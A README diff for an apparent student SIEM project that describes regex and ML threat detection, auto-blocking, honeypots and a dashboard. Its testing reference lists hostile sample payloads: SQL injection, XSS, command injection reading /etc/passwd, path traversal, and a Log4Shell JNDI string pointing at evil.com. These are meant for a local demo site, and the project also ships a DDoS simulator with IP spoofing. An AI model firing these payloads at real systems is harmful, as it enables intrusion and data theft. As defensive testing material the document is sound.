@@ -12,21 +12,14 @@
 <p>
   <img src="https://img.shields.io/badge/Status-Active-22c55e?style=for-the-badge"/>
   <img src="https://img.shields.io/badge/Platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white"/>
-  <img src="https://img.shields.io/badge/License-MIT-8b5cf6?style=for-the-badge"/>
   <img src="https://img.shields.io/badge/Version-2.0-ef4444?style=for-the-badge"/>
+  <img src="https://img.shields.io/badge/License-MIT-8b5cf6?style=for-the-badge"/>
 </p>
 
 <br/>
 
-> **Experience the future of security monitoring with our intuitive, real-time SOC dashboard.**
-
-<div style="display: flex; justify-content: center; gap: 10px; margin: 15px 0;">
-  <img src="images/screenshot1.png" alt="SENTINEL SIEM Dashboard Screenshot 1" style="width: 30%; border-radius: 8px; margin: 5px;"/>
-  <img src="images/screenshot2.png" alt="SENTINEL SIEM Dashboard Screenshot 2" style="width: 30%; border-radius: 8px; margin: 5px;"/>
-  <img src="https://mistralaiblackforestprod.blob.core.windows.net/images/blackforest/3c60/3dab/-c05/6-49aa-a70c-9e14b4cc8518/image.jpg?se=2026-04-26T16%3A13%3A03Z&sp=r&sv=2026-02-06&sr=b&skoid=0c825961-8b13-4c3f-94c2-848b13b71a98&sktid=4fbc1168-2984-4d17-af19-ac5138c2378e&skt=2026-04-26T15%3A13%3A03Z&ske=2026-04-26T16%3A13%3A03Z&sks=b&skv=2026-02-06&sig=%2BJ7OZJvP46bZeWl6bp%2BZhsi%2B%2BVXQTcQKp54t7Av7BFs%3D" alt="SENTINEL SIEM Dashboard Preview" style="width: 30%; border-radius: 8px; margin: 5px;"/>
-</div>
-
-> **A full-stack Enterprise SIEM system with real-time threat detection, AI-powered anomaly analysis, an automated firewall, and a cinematic SOC dashboard — engineered for defensive security research.**
+> A full-stack Enterprise SIEM system with real-time threat detection, AI-powered anomaly analysis,
+> an automated firewall, and a cinematic SOC dashboard — engineered for defensive security research.
 
 <br/>
 
@@ -34,18 +27,41 @@
 
 ---
 
-## 🗺️ System Architecture
+## Dashboard Preview
+
+<div align="center">
+  <img src="images/dashboard.png" alt="SENTINEL SIEM Main Dashboard" width="100%"/>
+  <p><i>Main SOC Dashboard — Real-time threat telemetry, stat cards, and world map tracking</i></p>
+</div>
+
+<br/>
+
+<div align="center">
+  <img src="images/ddos.png" alt="Mass DDoS Attack Simulation" width="100%"/>
+  <p><i>Mass DDoS Botnet Attack — 30 concurrent threads firing mixed payloads against SENTINEL</i></p>
+</div>
+
+<br/>
+
+<div align="center">
+  <img src="images/critical_dashboard.png" alt="Critical Alert State" width="100%"/>
+  <p><i>Critical Alert State — Dashboard after a sustained attack campaign triggers system lockdown</i></p>
+</div>
+
+---
+
+## System Architecture
 
 ```mermaid
 graph TB
-    subgraph IngestionLayer ["Ingestion Layer"]
+    subgraph INGESTION ["Ingestion Layer"]
         A[Web Requests] --> B[Flask API /api/logs]
         C[Login Attempts] --> B
         D[Honeypot Traps] --> B
-        E[Demo Website\nport 5050] -->|Middleware| B
+        E[Demo Website port 5050] -->|Middleware| B
     end
 
-    subgraph AnalysisEngine ["Analysis Engine"]
+    subgraph ANALYSIS ["Analysis Engine"]
         B --> F{Detection Engine\ncore/detection.py}
         F -->|Pattern Match| G[Signature DB\nSQL · XSS · CMDi\nSSRF · Log4Shell · XXE]
         F -->|Score| H[AI Anomaly Engine\ncore/ai_engine.py]
@@ -53,353 +69,334 @@ graph TB
         H -->|Rate Tracking| J[Rate Limiter\n25 req/min threshold]
     end
 
-    subgraph ResponseLayer ["Response Layer"]
+    subgraph RESPONSE ["Response Layer"]
         G --> K{Threat?}
         I --> K
         J --> K
         K -->|YES| L[Firewall SOAR\ncore/firewall.py]
         K -->|NO| M[Safe Log\nlogs/safe_logs.txt]
         L --> N[Auto Block IP\nlogs/banned_ips.json]
-        L --> O[System Lockdown\nif score ≥ 90]
+        L --> O[System Lockdown\nif score >= 90]
     end
 
-    subgraph StorageLayer ["Storage Layer"]
+    subgraph STORAGE ["Storage Layer"]
         N --> P[(SQLite DB\ndb/sentinel.db)]
         M --> P
-        P --> Q[Reporter\nCSV · JSON Export]
+        P --> Q[Reporter\nCSV / JSON Export]
     end
 
-    subgraph Dashboard ["SOC Dashboard"]
+    subgraph DASHBOARD ["SOC Dashboard"]
         P --> R[Live Chart\nReal-time Telemetry]
         P --> S[Threat Map\nGeo IP Tracking]
         P --> T[Analytics Tab\nAttack Breakdown]
-        N --> U[Firewall Panel\nManual Block/Unblock]
+        N --> U[Firewall Panel\nManual Block / Unblock]
         O --> V[Lockdown Banner\nVault Sealed]
     end
 
-    style IngestionLayer fill:#0f172a,stroke:#3b82f6,color:#94a3b8
-    style AnalysisEngine fill:#0f172a,stroke:#8b5cf6,color:#94a3b8
-    style ResponseLayer fill:#0f172a,stroke:#ef4444,color:#94a3b8
-    style StorageLayer fill:#0f172a,stroke:#22c55e,color:#94a3b8
-    style Dashboard fill:#0f172a,stroke:#f59e0b,color:#94a3b8
+    style INGESTION fill:#0f172a,stroke:#3b82f6,color:#94a3b8
+    style ANALYSIS fill:#0f172a,stroke:#8b5cf6,color:#94a3b8
+    style RESPONSE fill:#0f172a,stroke:#ef4444,color:#94a3b8
+    style STORAGE fill:#0f172a,stroke:#22c55e,color:#94a3b8
+    style DASHBOARD fill:#0f172a,stroke:#f59e0b,color:#94a3b8
 ```
 
 ---
 
-## ✨ Features
+## Features
 
-<table>
-<tr>
-<td width="50%">
+**Detection Engine**
+- 8 attack vectors — SQL Injection, XSS, Command Injection, Path Traversal, SSRF, Log4Shell, XXE, Brute Force
+- 47 compiled regex signatures across all categories with cumulative risk scoring
+- Honeypot traps on 6 fake endpoints that auto-block any probing source with zero false positives
+- Signature and ML anomaly detection running in parallel on every request
 
-### Detection Engine
-- **8 Attack Vectors** — SQL Injection, XSS, Command Injection, Path Traversal, SSRF, Log4Shell, XXE, Brute Force
-- **Honeypot Traps** — 6 fake endpoints that auto-block any attacker who probes them (`/.env`, `/phpmyadmin`, `/admin_bypass`...)
-- **Signature + AI hybrid** — pattern matching layered with ML anomaly scoring
+**AI Anomaly Engine**
+- IsolationForest unsupervised ML model — n_estimators=150, contamination=0.08
+- 3-feature input vector: risk score, threat flag, payload length — standardized via StandardScaler
+- Rate-based behavioral detection — 25 requests per minute per source IP triggers auto-block
+- Synthetic baseline training on fresh install eliminates the cold-start problem
 
-</td>
-<td width="50%">
+**SOAR Firewall**
+- Auto-block on CRITICAL severity events, system lockdown on threshold breach
+- Persistent blocklist survives server restarts via banned_ips.json
+- Manual block and unblock controls directly from the SOC dashboard
+- One-click restore to lift lockdown and reset all counters
 
-### AI Anomaly Engine
-- **IsolationForest ML model** — trained on live session data
-- **3-feature analysis** — risk score, threat flag, payload length
-- **Rate-based detection** — 25 req/min threshold per IP
-- **Synthetic baseline training** — works on fresh install with no prior data
+**SOC Dashboard**
+- Real-time Chart.js line chart showing threats vs safe traffic over time
+- Geo-accurate world map with animated attack origin dots per detection
+- Toast notification system — instant popup on every new threat event
+- Analytics tab — attack type donut chart, severity bar chart, session summary
+- CSV and JSON export for offline forensic analysis
 
-</td>
-</tr>
-<tr>
-<td width="50%">
+**Website Integration**
+- WSGI middleware — single-line integration into any Flask or Django application
+- Non-blocking background threads — zero latency impact on the protected application
+- Built-in demo website on port 5050 with pre-wired attack test forms
+- POST body scanning — form data and JSON payloads both analyzed
 
-### SOAR Firewall
-- **Auto-block** on CRITICAL threats
-- **System Lockdown** when threat score ≥ 90
-- **Persistent blocklist** — survives restarts (`banned_ips.json`)
-- **Manual block/unblock** from SOC dashboard
-- **One-click restore** — lifts lockdown instantly
-
-</td>
-<td width="50%">
-
-### SOC Dashboard
-- **Real-time traffic chart** — threats vs safe, live line chart
-- **World map** — animated attack origin dots on geo-accurate map
-- **Toast notifications** — instant threat popups on new events
-- **Analytics tab** — attack type donut chart, severity bar chart
-- **CSV/JSON export** — download session logs for forensics
-
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-### Website Integration
-- **WSGI middleware** — one-line integration into any Flask/Django app
-- **Non-blocking** — background threads, zero latency impact
-- **Built-in demo site** — test attacks on a live simulated website
-- **POST body scanning** — form data and JSON payloads analyzed
-
-</td>
-<td width="50%">
-
-### Attack Simulator
-- **Injection Tool** — SQL, XSS, Log4Shell, Path Traversal payloads
-- **Mass DDoS Botnet** — 30 concurrent threads with random IP spoofing
-- **Safe Traffic Generator** — legitimate requests for baseline data
-- **One-click launcher** — all simulators managed from `run.bat`
-
-</td>
-</tr>
-</table>
+**Attack Simulators**
+- Injection tool — SQL, XSS, Log4Shell, Path Traversal payloads against login endpoint
+- Mass DDoS botnet — 30 concurrent threads with per-request random IP spoofing
+- Safe traffic generator — clean legitimate requests to build a detection baseline
 
 ---
 
-## 🚀 Quick Start
+## Quick Start
 
-### Prerequisites
+**Prerequisites**
 ```
-Python 3.10+   (with "Add to PATH" checked during install)
-Windows 10/11
+Python 3.10 or above
+Windows 10 / 11
+"Add Python to PATH" must be checked during Python installation
 ```
 
-### Installation
-
+**Installation**
 ```bash
-# 1. Clone the repository
-git clone https://github.com/AbhaySinghTaknet/SENTINEL_SIEM.git
+git clone https://github.com/abhaystic/SENTINEL_SIEM.git
 cd SENTINEL_SIEM
-
-# 2. Run one-click setup (installs all dependencies)
-setup.bat
-
-# 3. Launch the system
-run.bat
 ```
 
-The dashboard opens automatically at `http://localhost:5000`.
+Double-click `setup.bat` — installs all dependencies automatically.
+
+Double-click `run.bat` — the dashboard opens at `http://localhost:5000`.
 
 ---
 
-## 🎛️ Control Panel (`run.bat`)
+## Control Panel
+
+`run.bat` is the single entry point for the entire system:
 
 ```
-╔══════════════════════════════════════════════════════╗
-║   SENTINEL SIEM  |  Control Panel                    ║
-╠══════════════════════════════════════════════════════╣
-║                                                      ║
-║   [1]  Start SENTINEL SIEM System                    ║
-║   [2]  Launch Attack Simulator                       ║
-║   [3]  Launch Demo Website  (port 5050)              ║
-║   [4]  Stop All  (close everything)                  ║
-║   [5]  Exit                                          ║
-║                                                      ║
-╚══════════════════════════════════════════════════════╝
+============================================================
+  SENTINEL SIEM  |  Control Panel
+  Engineered by Abhay Singh Taknet
+============================================================
+
+  [1]  Start SENTINEL SIEM System
+  [2]  Launch Attack Simulator
+  [3]  Launch Demo Website  (port 5050)
+  [4]  Stop All
+  [5]  Exit
+
+============================================================
 ```
 
-| Option | Description |
-|--------|-------------|
-| **1 — Start System** | Launches main server (5000) + Client Portal (5001), opens dashboard in browser |
-| **2 — Attack Simulator** | Sub-menu for injection attacks, mass DDoS, safe traffic generator |
-| **3 — Demo Website** | Starts a simulated website on port 5050 for integration testing |
-| **4 — Stop All** | Kills all Python processes, closes all terminals, releases ports 5000/5001/5050 |
+| Option | Action |
+|--------|--------|
+| 1 — Start System | Launches main server on port 5000 and Client Portal on port 5001, opens browser |
+| 2 — Attack Simulator | Sub-menu for injection attacks, mass DDoS botnet, safe traffic generator |
+| 3 — Demo Website | Starts integration demo site on port 5050 for live middleware testing |
+| 4 — Stop All | Kills all Python processes, closes all terminals, releases all ports |
 
 ---
 
-## 🌐 Website Integration
+## Website Integration
 
-### Method 1 — One-line Middleware (Recommended)
-Drop this into any existing Flask project:
+**Single-line middleware — drop into any Flask project:**
 
 ```python
 from integration.sentinel_middleware import SentinelMiddleware
 
 app = Flask(__name__)
-# ... your existing code ...
-app.wsgi_app = SentinelMiddleware(app.wsgi_app)  # One-line integration
+# your existing routes below
+app.wsgi_app = SentinelMiddleware(app.wsgi_app)
 ```
 
-### Method 2 — Built-in Demo Site
-```
-run.bat → [1] Start SENTINEL → [3] Launch Demo Website
-```
-Visit `http://localhost:5050` and try attacks in the login form.
+Every HTTP request to your application is now scanned by SENTINEL in a background thread — no latency impact, no architectural changes required.
 
-### Method 3 — Direct API
-```python
-import requests
+**Testing with the built-in demo site:**
 
-requests.post("http://localhost:5000/api/logs", json={
-    "key": "SENTINEL-9921",
-    "payload": user_input_to_scan
-}, headers={"X-Forwarded-For": client_ip})
+```
+run.bat  ->  [1] Start SENTINEL  ->  [3] Launch Demo Website
+```
+
+Open `http://localhost:5050`, submit payloads in the login form, and watch `http://localhost:5000` react in real time.
+
+---
+
+## Honeypot Endpoints
+
+Any HTTP request to these paths immediately blocks the source IP regardless of payload content:
+
+```
+/.env             /phpmyadmin       /admin_bypass
+/db_backup.zip    /secret_keys      /wp-admin
 ```
 
 ---
 
-## 🍯 Honeypot Endpoints
-
-Any request to these paths instantly blocks the source IP:
-
-```
-/phpmyadmin     /admin_bypass     /.env
-/db_backup.zip  /secret_keys      /wp-admin
-```
-
----
-
-## 📡 API Reference
+## API Reference
 
 | Endpoint | Method | Description |
 |----------|--------|-------------|
-| `/` | GET | SOC Dashboard UI |
-| `/api/logs` | GET | Fetch all logs (dashboard polling) |
-| `/api/logs` | POST | Submit payload for analysis `{key, payload}` |
-| `/api/get_stats` | GET | CPU/RAM/disk + threat counters |
-| `/api/analytics` | GET | DB-level severity breakdown + hourly activity |
-| `/api/block_ip` | POST | Manual IP block `{ip}` |
-| `/api/unblock_ip` | POST | Manual IP unblock `{ip}` |
-| `/api/restore_system` | POST | Lift lockdown, reset counters |
-| `/api/export_csv` | GET | Download all logs as CSV |
-| `/api/export_threats_csv` | GET | Download threats-only CSV |
-| `/api/attack_stats` | GET | Attack type breakdown + session summary |
+| `/` | GET | SOC Dashboard |
+| `/api/logs` | GET | Fetch all logs for dashboard polling |
+| `/api/logs` | POST | Submit payload for analysis — API key required |
+| `/api/get_stats` | GET | CPU, RAM, disk and threat counters |
+| `/api/analytics` | GET | Severity breakdown and hourly activity |
+| `/api/block_ip` | POST | Manual IP block |
+| `/api/unblock_ip` | POST | Manual IP unblock |
+| `/api/restore_system` | POST | Lift lockdown and reset counters |
+| `/api/export_csv` | GET | Download all session logs as CSV |
+| `/api/export_threats_csv` | GET | Download threats-only as CSV |
+| `/api/attack_stats` | GET | Attack type breakdown and session summary |
 | `/api/clear_logs` | POST | Clear in-memory session logs |
-| `/view_secrets` | GET | Vault access (sealed during lockdown) |
+| `/view_secrets` | GET | Vault — returns 403 during lockdown |
 
 ---
 
-## 🗂️ Project Structure
+## Project Structure
 
 ```
 SENTINEL_SIEM/
-│
-├── app.py                          # Main Flask server — all routes & logic
-├── run.bat                         # One-click control panel (start/attack/stop)
-├── setup.bat                       # One-click dependency installer
-├── requirements.txt
-│
-├── core/
-│   ├── ai_engine.py                # IsolationForest ML + rate limiting
-│   ├── detection.py                # Signature-based threat detection (8 attack types)
-│   ├── database.py                 # Thread-safe SQLite wrapper
-│   ├── firewall.py                 # IP blocklist management (SOAR)
-│   └── reporter.py                 # CSV/JSON export + analytics
-│
-├── templates/
-│   └── dashboard.html              # SOC dashboard (pure HTML/CSS/JS)
-│
-├── attacks/
-│   ├── injection_tool.py           # SQL + XSS + Honeypot simulator
-│   ├── mass_attacker.py            # 30-thread DDoS botnet simulator
-│   ├── safe_traffic_gen.py         # Legitimate traffic generator
-│   └── safe_logs.py
-│
-├── integration/
-│   ├── sentinel_middleware.py      # WSGI middleware for any Flask/Django site
-│   └── example_site/
-│       └── site_app.py             # Demo website (port 5050)
-│
-├── Client_Portal/                  # Simulated client-facing web portal
-│   └── portal_app.py
-│
-├── images/                         # Dashboard screenshots
-│   ├── screenshot1.png
-│   └── screenshot2.png
-│
-├── logs/
-│   ├── banned_ips.json             # Persistent IP blocklist
-│   ├── threat_events.txt           # Flat log — threat events
-│   └── safe_logs.txt               # Flat log — safe traffic
-│
-├── db/
-│   └── sentinel.db                 # SQLite database (auto-created)
-│
-├── exports/                        # CSV/JSON reports (auto-generated)
-│
-└── userguide_and_research/         # User guides and research documents
-    ├── userguide.pdf               # User guide for SENTINEL SIEM
-    └── research_paper.pdf          # Research paper for SENTINEL SIEM
+|
++-- app.py                                   Main Flask server
++-- run.bat                                  One-click control panel
++-- setup.bat                                One-click dependency installer
++-- requirements.txt
++-- README.md
+|
++-- core/
+|   +-- ai_engine.py                         IsolationForest ML model and rate limiter
+|   +-- detection.py                         Signature-based detection — 8 attack types
+|   +-- database.py                          Thread-safe SQLite wrapper
+|   +-- firewall.py                          IP blocklist management
+|   +-- reporter.py                          CSV / JSON export and analytics
+|
++-- templates/
+|   +-- dashboard.html                       SOC dashboard — HTML / CSS / JS
+|
++-- attacks/
+|   +-- injection_tool.py                    SQL + XSS + Honeypot attack simulator
+|   +-- mass_attacker.py                     30-thread DDoS botnet simulator
+|   +-- safe_traffic_gen.py                  Legitimate traffic generator
+|
++-- integration/
+|   +-- sentinel_middleware.py               WSGI middleware for Flask / Django
+|   +-- example_site/
+|       +-- site_app.py                      Demo website on port 5050
+|
++-- Client_Portal/
+|   +-- portal_app.py                        Simulated client-facing web portal
+|
++-- images/
+|   +-- dashboard.png                        Main SOC dashboard screenshot
+|   +-- ddos.png                             Mass DDoS attack simulation screenshot
+|   +-- critical_dashboard.png               Critical alert and lockdown state screenshot
+|
++-- userguide & research/
+|   +-- SENTINEL_SIEM_Research_Paper.pdf     Technical research paper
+|   +-- SENTINEL_SIEM_User_Guide.pdf         Complete user and deployment guide
+|
++-- logs/
+|   +-- banned_ips.json                      Persistent IP blocklist
+|   +-- threat_events.txt                    Flat threat event log
+|   +-- safe_logs.txt                        Flat safe traffic log
+|
++-- db/
+|   +-- sentinel.db                          SQLite database — auto-created on first run
+|
++-- exports/                                 CSV / JSON reports generated on demand
++-- secure_data/
+    +-- company_secrets.txt                  Vault contents — sealed during lockdown
 ```
 
 ---
 
-## 🧪 Attack Testing Cheatsheet
+## Attack Testing Reference
 
-After launching the demo site (`run.bat → Option 3`), try these in the login form at `http://localhost:5050`:
+After starting the demo site via `run.bat`, try these payloads in the login form at `http://localhost:5050`:
 
-```sql
--- SQL Injection
-admin' OR '1'='1
-' UNION SELECT null, null--
-1; DROP TABLE users--
-
--- XSS
-<script>alert('SENTINEL')</script>
-<img src=x onerror=alert(1)>
-
--- Command Injection
-admin; cat /etc/passwd
-| whoami
-
--- Log4Shell (CRITICAL — instant lockdown)
-${jndi:ldap://evil.com/exploit}
-
--- Path Traversal
-../../../../etc/passwd
 ```
+SQL Injection
+    admin' OR '1'='1
+    ' UNION SELECT null, null--
+    1; DROP TABLE users--
+
+XSS
+    <script>alert('SENTINEL')</script>
+    <img src=x onerror=alert(1)>
+
+Command Injection
+    admin; cat /etc/passwd
+    | whoami
+
+Log4Shell   (CRITICAL — triggers instant lockdown)
+    ${jndi:ldap://evil.com/exploit}
+
+Path Traversal
+    ../../../../etc/passwd
+```
+
+Each payload produces a detection event — threat feed updates, map dot animates, toast fires, IP is blocked.
 
 ---
 
-## 🔴 Lockdown Mode
+## Documentation
 
-When 5+ CRITICAL threats are detected, SENTINEL enters full lockdown:
-
-```
-⚠ SYSTEM LOCKDOWN ACTIVE
-  Critical threat threshold exceeded.
-  Vault access disabled. All unknown IPs denied.
-                                    [ RESTORE ]
-```
-
-- Red banner appears across the entire dashboard
-- `/view_secrets` vault is sealed — returns 403
-- All subsequent unknown IPs are denied
-- Click **RESTORE** or hit `run.bat → Option 4 (Stop All)` to recover
+| Document | Description |
+|----------|-------------|
+| [SENTINEL\_SIEM\_Research\_Paper.pdf](userguide%20%26%20research/SENTINEL_SIEM_Research_Paper.pdf) | IEEE-format technical paper — architecture, detection methodology, AI engine design, evaluation results |
+| [SENTINEL\_SIEM\_User\_Guide.pdf](userguide%20%26%20research/SENTINEL_SIEM_User_Guide.pdf) | Complete user guide — setup, usage, attack simulation, integration, and troubleshooting |
 
 ---
 
-## 🛠️ Tech Stack
-
-<div align="center">
+## Tech Stack
 
 | Layer | Technology |
-|-------|-----------|
-| **Backend** | Python 3.10+, Flask 2.3+ |
-| **ML Engine** | scikit-learn (IsolationForest), NumPy, Pandas |
-| **Database** | SQLite3 (thread-safe, WAL mode) |
-| **Frontend** | Vanilla HTML/CSS/JS, Chart.js, TailwindCSS CDN |
-| **System Metrics** | psutil |
-| **HTTP Client** | requests |
-| **Process Control** | Windows BAT + PowerShell |
+|-------|------------|
+| Backend | Python 3.10+, Flask 2.3+ |
+| ML Engine | scikit-learn — IsolationForest, StandardScaler |
+| Data Processing | NumPy, Pandas |
+| Database | SQLite3 — thread-safe WAL mode |
+| Frontend | HTML / CSS / JavaScript, Chart.js, Tailwind CSS |
+| System Metrics | psutil |
+| HTTP Client | requests |
+| Process Control | Windows BAT, PowerShell |
 
-</div>
+---
+
+## Disclaimer
+
+SENTINEL SIEM is built strictly for defensive security research, academic study, and authorized penetration testing in controlled environments. The included attack simulators are designed solely to test the detection engine against a local setup.
+
+Do not use any component of this project against systems you do not own or have explicit written permission to test.
+
+---
+
+## License
+
+MIT License — see LICENSE for details.
 
 ---
 
 <div align="center">
 
-<!-- FOOTER WAVE -->
 <img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f3460,50:1a1a2e,100:0d1117&height=120&section=footer" width="100%"/>
 
 <br/>
 
-**Built by Abhay Singh Taknet**
+**Abhay Singh Taknet**
 
----
+B.Tech Computer Science and Engineering
+Sobhasaria Group of Institutions, Sikar — Bikaner Technical University
+Roll No. 22ESGCS006 | Session 2025–2026
 
-### Contact & Detailed Reading
-📧 **Email:** abhaytaknet@gmail.com
-🔗 **LinkedIn:** [www.linkedin.com/in/abhay-singh-551aa6325](www.linkedin.com/in/abhay-singh-551aa6325)
-📄 **Research Paper:** [SENTINEL SIEM Research Paper](userguide_and_research/research_paper.pdf)
-📖 **User Guide:** [SENTINEL SIEM User Guide](userguide_and_research/userguide.pdf)
+<br/>
+
+<a href="https://www.linkedin.com/in/abhay-singh-taknet">
+  <img src="https://img.shields.io/badge/LinkedIn-Abhay%20Singh%20Taknet-0077b5?style=for-the-badge&logo=linkedin&logoColor=white"/>
+</a>
+&nbsp;
+<a href="mailto:abhaysinghtaknet@gmail.com">
+  <img src="https://img.shields.io/badge/Email-abhaysinghtaknet@gmail.com-ea4335?style=for-the-badge&logo=gmail&logoColor=white"/>
+</a>
+&nbsp;
+<a href="https://github.com/abhaystic/SENTINEL_SIEM">
+  <img src="https://img.shields.io/badge/GitHub-abhaystic%2FSENTINEL__SIEM-181717?style=for-the-badge&logo=github&logoColor=white"/>
+</a>
+
+<br/><br/>
 
 </div>
